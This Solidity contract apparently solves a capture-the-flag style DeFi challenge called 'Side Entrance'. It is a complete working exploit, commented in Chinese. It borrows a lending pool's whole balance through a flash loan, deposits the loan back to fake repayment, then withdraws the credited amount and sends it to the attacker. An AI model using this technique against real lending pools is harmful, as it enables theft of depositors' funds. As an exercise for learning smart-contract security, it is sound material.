pragma solidity 0.8.17;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function flashLoan() external {
        // 1. flashLoan 借出 pool 全部的餘額
        pool.flashLoan(address(pool).balance);
        // 3. 再將存入的金額提領出來
        pool.withdraw();
        // 4. 轉給攻擊者
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable override {
        require(msg.sender == address(pool), "not the pool");
        // 2. 將借到的金額存入 pool
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
